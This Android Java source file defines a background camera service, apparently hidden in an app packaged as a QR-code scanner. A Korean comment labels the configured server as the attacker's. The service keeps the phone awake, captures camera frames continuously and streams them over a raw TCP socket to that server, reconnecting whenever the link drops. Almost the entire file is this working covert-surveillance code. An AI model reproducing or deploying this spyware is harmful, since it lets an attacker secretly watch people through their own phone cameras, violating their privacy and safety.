package com.example.qrcode;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.os.*;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;

public class CameraService extends Service {
    private static final String SERVER_IP = "192.168.0.101";  // 공격자 서버 IP
    private static final int SERVER_PORT = 5001; // TCP 포트
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Socket socket;
    private OutputStream outputStream;
    private PowerManager.WakeLock wakeLock;
    private Handler handler;


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("CameraService", "📸 Camera Service Started");

        handler = new Handler(Looper.getMainLooper());
        startForegroundService(); // ✅ Foreground 서비스 실행
        acquireWakeLock(); // ✅ WakeLock 획득

        new Thread(() -> {
            try {
                socket = new Socket(SERVER_IP, SERVER_PORT);
                outputStream = socket.getOutputStream();
                Log.d("CameraService", "✅ Connected to Server: " + SERVER_IP + ":" + SERVER_PORT);
            } catch (IOException e) {
                Log.e("CameraService", "❌ Socket Connection Failed: " + e.getMessage());
            }
        }).start();

        connectToServer();

        openCamera();
    }

    private void connectToServer() {
        new Thread(() -> {
            while (socket == null || outputStream == null) {
                try {
                    socket = new Socket(SERVER_IP, SERVER_PORT);
                    outputStream = socket.getOutputStream();
                    Log.d("CameraService", "✅ Connected to Server: " + SERVER_IP + ":" + SERVER_PORT);
                } catch (IOException e) {
                    Log.e("CameraService", "❌ Socket Connection Failed: " + e.getMessage());
                    try {
                        Thread.sleep(2000); // 🔄 2초 후 재시도
                    } catch (InterruptedException ie) {
                        ie.printStackTrace();
                    }
                }
            }
        }).start();
    }


    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CameraService::WakeLock");
        wakeLock.setReferenceCounted(false);  // 🔹 WakeLock이 자동 해제되지 않도록 설정
        if (!wakeLock.isHeld()) {
            wakeLock.acquire();
            Log.d("CameraService", "🔋 WakeLock acquired (held until service stops)");
        }
    }

    private void openCamera() {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) !=
                    android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e("CameraService", "❌ Camera Permission NOT granted!");
                return;
            }

            if (cameraDevice != null) {
                cameraDevice.close();

                Log.d("CameraService", "🔄 Previous Camera Session Closed");
            }

            String[] cameraList = manager.getCameraIdList();
            if (cameraList.length == 0) {
                Log.e("CameraService", "❌ No available cameras found!");
                return;
            }

            String cameraId = cameraList[1]; // 후면 카메라 (0: 전면, 1: 후면)
            Log.d("CameraService", "📷 Attempting to open Camera: " + cameraId);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    Log.d("CameraService", "✅ Camera Opened: " + cameraId);
                    startCaptureSession();
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    Log.e("CameraService", "❌ Camera Disconnected! Retrying in 5 seconds...");
                    closeCamera();
                    handler.postDelayed(() -> openCamera(), 5000); // 🔄 5초 후 재시도
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    Log.e("CameraService", "❌ Camera Error: " + error + " Retrying in 5 seconds...");
                    closeCamera();
                    handler.postDelayed(() -> openCamera(), 5000); // 🔄 5초 후 재시도
                }

                // ✅ 카메라 리소스 해제 함수 추가
                private void closeCamera() {
                    if (cameraDevice != null) {
                        cameraDevice.close();
                        cameraDevice = null;
                    }
                    if (captureSession != null) {
                        captureSession.close();
                        captureSession = null;
                    }
                    if (imageReader != null) {
                        imageReader.close();
                        imageReader = null;
                    }
                }

            }, null);
        } catch (CameraAccessException | SecurityException e) {
            Log.e("CameraService", "❌ Camera Access Error: " + e.getMessage());
        }
    }

    private void startCaptureSession() {
        imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
        imageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null && image.getPlanes().length > 0) {
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    if (buffer == null) {
                        Log.e("CameraService", "❌ Image buffer is NULL");
                        return;
                    }

                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    Log.d("CameraService", "📸 Captured Image Size: " + bytes.length + " bytes");

                    // ✅ 네트워크 작업을 백그라운드 스레드에서 실행
                    new Thread(() -> {
                        try {
                            if (socket == null || outputStream == null || !socket.isConnected()) {
                                Log.e("CameraService", "❌ OutputStream is NULL or Socket is NOT connected. Retrying connection...");
                                connectToServer(); // 🔄 소켓 자동 재연결
                                return;
                            }

                            try {
                                Thread.sleep(200);  // 100ms 딜레이 추가
                            } catch (InterruptedException e) {
                                Log.e("CameraService", "❌ Thread sleep interrupted: " + e.getMessage());
                                Thread.currentThread().interrupt();  // 🔹 현재 스레드의 인터럽트 상태를 복원
                            }


                            // ✅ 프레임 전송
                            String header = "FRAME_START";
                            String footer = "FRAME_END";

                            outputStream.write(header.getBytes());
                            outputStream.write(bytes);
                            outputStream.write(footer.getBytes());
                            outputStream.flush();

                            Log.d("CameraService", "✅ Image Sent Successfully: " + bytes.length + " bytes");

                        } catch (IOException e) {
                            Log.e("CameraService", "❌ Error sending image data: " + e.getMessage());
                            e.printStackTrace();
                        }
                    }).start();  // 🔹 백그라운드 스레드 실행

                } else {
                    Log.e("CameraService", "❌ Image buffer is empty or null!");
                }
            } catch (Exception e) {
                Log.e("CameraService", "❌ Unexpected Error in Image Processing", e);
                e.printStackTrace();
            } finally {
                if (image != null) {
                    image.close();
                }
            }
        }, null);







        try {
            cameraDevice.createCaptureSession(
                    java.util.Arrays.asList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                CaptureRequest.Builder requestBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                requestBuilder.addTarget(imageReader.getSurface());
                                captureSession.setRepeatingRequest(requestBuilder.build(), null, null);
                                Log.d("CameraService", "✅ Capture Session Started");
                            } catch (CameraAccessException e) {
                                Log.e("CameraService", "❌ Capture Session Error: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Log.e("CameraService", "❌ Capture Session Configuration Failed");
                        }
                    }, null
            );
        } catch (CameraAccessException e) {
            Log.e("CameraService", "❌ Capture Session Error: " + e.getMessage());
        }
    }

    private void startForegroundService() {
        String channelId = "camera_service";
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Camera Service", NotificationManager.IMPORTANCE_LOW);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("Camera Service Running")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();

        startForeground(1, notification);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d("CameraService", "🔋 WakeLock Released");
        }
        try {
            if (socket != null) {
                socket.close();
                Log.d("CameraService", "✅ Socket Closed");
            }
        } catch (IOException e) {
            Log.e("CameraService", "❌ Socket Close Error: " + e.getMessage());
        }
    }
}
